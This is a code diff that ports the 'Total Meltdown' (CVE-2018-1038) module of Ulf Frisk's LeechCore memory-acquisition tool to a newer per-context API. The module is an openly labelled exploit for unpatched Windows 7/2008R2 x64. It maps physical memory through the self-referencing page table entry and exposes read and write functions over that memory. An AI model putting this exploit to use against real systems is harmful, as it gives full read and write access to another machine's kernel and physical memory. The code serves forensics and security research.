@@ -1,14 +1,15 @@
-// devicetmd.h : implementation related to the "total meltdown" memory acquisition "device".
-//               Also known as: CVE-2018-1038. Please see Microsoft advisory for more information:
-//               https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-1038
+// device_tmd.h : implementation related to the "total meltdown" memory acquisition "device".
+//                Also known as: CVE-2018-1038. Please see Microsoft advisory for more information:
+//                https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-1038
 //
 // (c) Ulf Frisk, 2020
 // Author: Ulf Frisk, pcileech@frizk.net
 //
-#ifdef _WIN32
-#include "device.h"
-#include "memmap.h"
+#include "leechcore.h"
+#include "leechcore_device.h"
+#include "leechcore_internal.h"
 #include "util.h"
+#ifdef _WIN32
 
 // PML4 self ref entry at position 0x1ed in Windows 7 (static offset/address)
 // (this is not the case in Windows10 [which is not vulnerable...])
@@ -41,7 +42,7 @@ typedef struct tdDEVICE_CONTEXT_TMD {
 * devices without risking of bluescreening the system. Memory map retrieval fixes this.
 */
 _Success_(return)
-BOOL DeviceTMD_MemoryMapRetrieve(PDEVICE_CONTEXT_TMD ctxTMd)
+BOOL DeviceTMD_MemoryMapRetrieve(_Inout_ PLC_CONTEXT ctxLC, PDEVICE_CONTEXT_TMD ctxTMd)
 {
     LSTATUS status;
     HKEY hKey = NULL;
@@ -79,11 +80,10 @@ BOOL DeviceTMD_MemoryMapRetrieve(PDEVICE_CONTEXT_TMD ctxTMd)
     ctxTMd->cMemoryRanges = c2;
     ctxTMd->pbMemoryRangesBuffer = pbData;
     ctxTMd->pMemoryRanges = (PMEMORY_RANGE)(pbData + 0x14);
-    MemMap_Initialize(0x0000ffffffffffff);
+    if(ctxTMd->cMemoryRanges == 0) { goto fail; }
     for(i = 0; i < ctxTMd->cMemoryRanges; i++) {
-        MemMap_AddRange(ctxTMd->pMemoryRanges[i].pa, ctxTMd->pMemoryRanges[i].cb, ctxTMd->pMemoryRanges[i].pa);
+        LcMemMap_AddRange(ctxLC, ctxTMd->pMemoryRanges[i].pa, ctxTMd->pMemoryRanges[i].cb, ctxTMd->pMemoryRanges[i].pa);
     }
-    if(!MemMap_GetMaxAddress(&ctxTMd->paMax)) { goto fail; }
     return TRUE;
 fail:
     if(hKey) { RegCloseKey(hKey); }
@@ -178,89 +178,83 @@ BOOL DeviceTMD_Identify()
     } __except(EXCEPTION_EXECUTE_HANDLER) { return FALSE; }
 }
 
-VOID DeviceTMD_ReadScatterMEM(_Inout_ PPMEM_IO_SCATTER_HEADER ppMEMs, _In_ DWORD cpMEMs)
+VOID DeviceTMD_ReadScatter(_In_ PLC_CONTEXT ctxLC, _In_ DWORD cpMEMs, _Inout_ PPMEM_SCATTER ppMEMs)
 {
-    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctxDeviceMain->hDevice;
-    PMEM_IO_SCATTER_HEADER pMEM;
+    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctxLC->hDevice;
+    PMEM_SCATTER pMEM;
     DWORD i;
     for(i = 0; i < cpMEMs; i++) {
         pMEM = ppMEMs[i];
-        if(!MemMap_VerifyTranslateMEM(pMEM, NULL)) { continue; }
+        if(pMEM->f || MEM_SCATTER_ADDR_ISINVALID(pMEM)) { continue; }
         __try {
-            memcpy(pMEM->pb, (PBYTE)(ctxTMd->vaBasePhys + pMEM->qwA), pMEM->cbMax);
-        } __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
-        pMEM->cb = pMEM->cbMax;
+            memcpy(pMEM->pb, (PBYTE)(ctxTMd->vaBasePhys + pMEM->qwA), pMEM->cb);
+            pMEM->f = TRUE;
+        } __except(EXCEPTION_EXECUTE_HANDLER) { ; }
     }
 }
 
 _Success_(return)
-BOOL DeviceTMD_WriteMEM(_In_ QWORD pa, _In_reads_(cb) PBYTE pb, _In_ DWORD cb)
+BOOL DeviceTMD_Write(_In_ PLC_CONTEXT ctxLC, _In_ QWORD pa, _In_ DWORD cb, _In_reads_(cb) PBYTE pb)
 {
-    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctxDeviceMain->hDevice;
+    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctxLC->hDevice;
     __try {
         memcpy((PBYTE)(ctxTMd->vaBasePhys + pa), pb, cb);
     } __except(EXCEPTION_EXECUTE_HANDLER) { return FALSE; }
     return TRUE;
 }
 
-VOID DeviceTMD_Close()
+VOID DeviceTMD_Close(_Inout_ PLC_CONTEXT ctxLC)
 {
-    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctxDeviceMain->hDevice;
+    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctxLC->hDevice;
     if(!ctxTMd) { return; }
     if(ctxTMd->pvPageTables) {
         *(PQWORD)(TMD_VA_PML4 + (ctxTMd->iPML4ePhysMap << 3)) = 0;
         VirtualFree(ctxTMd->pvPageTables, 0, MEM_RELEASE);
     }
     LocalFree(ctxTMd);
-    ctxDeviceMain->hDevice = 0;
+    ctxLC->hDevice = 0;
 }
 
 _Success_(return)
-BOOL DeviceTMD_Open()
+BOOL DeviceTMD_Open(_Inout_ PLC_CONTEXT ctxLC)
 {
     PDEVICE_CONTEXT_TMD ctxTMd = NULL;
-    if(!ctxDeviceMain) { return FALSE; }
     if(!(ctxTMd = (PDEVICE_CONTEXT_TMD)LocalAlloc(LMEM_ZEROINIT, sizeof(DEVICE_CONTEXT_TMD)))) { return FALSE; }
     // 1: Test for vulnerability and set up page tables using for virtual2physical mappings
     if(!DeviceTMD_Identify()) {
-        vprintf(
+        lcprintf(ctxLC,
             "TOTALMELTDOWN: Failed.  System not vulnerable for Total Meltdown attack.\n" \
             "  Only Windows 7/2008R2 x64 with 2018-01, 2018-02, 2018-03 patches are vulnerable.\n");
         goto fail;
     }
     // 2: Retrieve physical memory map from registry
-    if(!DeviceTMD_MemoryMapRetrieve(ctxTMd)) {
-        vprintf("TOTALMELTDOWN: Failed. Failed parsing memory map from registry.\n");
+    if(!DeviceTMD_MemoryMapRetrieve(ctxLC, ctxTMd)) {
+        lcprintf(ctxLC, "TOTALMELTDOWN: Failed. Failed parsing memory map from registry.\n");
         goto fail;
     }
     // 3: Exploit! == create page table mappings.
     DeviceTMD_SetupPageTable(ctxTMd);
     // 4: Set callback functions and fix up config
-    ctxDeviceMain->hDevice = (HANDLE)ctxTMd;
-    ctxDeviceMain->cfg.tpDevice = LEECHCORE_DEVICE_TOTALMELTDOWN;
-    ctxDeviceMain->cfg.fVolatile = TRUE;
-    ctxDeviceMain->cfg.paMaxNative = ctxTMd->paMax;
-    ctxDeviceMain->pfnClose = DeviceTMD_Close;
-    ctxDeviceMain->pfnReadScatterMEM = DeviceTMD_ReadScatterMEM;
-    ctxDeviceMain->pfnWriteMEM = DeviceTMD_WriteMEM;
-    vprintfv("TOTALMELTDOWN/CVE-2018-1038: Successfully exploited for physical memory access.\n");
+    ctxLC->hDevice = (HANDLE)ctxTMd;
+    ctxLC->Config.fVolatile = TRUE;
+    ctxLC->pfnClose = DeviceTMD_Close;
+    ctxLC->pfnReadScatter = DeviceTMD_ReadScatter;
+    ctxLC->pfnWriteContigious = DeviceTMD_Write;
+    lcprintf(ctxLC, "TOTALMELTDOWN/CVE-2018-1038: Successfully exploited for physical memory access.\n");
     return TRUE;
 fail:
     LocalFree(ctxTMd);
-    ctxDeviceMain->hDevice = 0;
+    ctxLC->hDevice = 0;
     return FALSE;
 }
 
 #endif /* _WIN32 */
 #ifdef LINUX
-#include "device.h"
 
 _Success_(return)
-BOOL DeviceTMD_Open()
+BOOL DeviceTMD_Open(_Inout_ PLC_CONTEXT ctxLC)
 {
-    vprintf(
-        "TOTALMELTDOWN: Failed.  System not vulnerable for Total Meltdown attack.\n" \
-        "  Only Windows 7/2008R2 x64 with 2018-01, 2018-02, 2018-03 patches are vulnerable.\n");
+    lcprintf(ctxLC, "TOTALMELTDOWN: Failed.  System not vulnerable for Total Meltdown attack.\n  Only Windows 7/2008R2 x64 with 2018-01, 2018-02, 2018-03 patches are vulnerable.\n");
     return FALSE;
 }
 
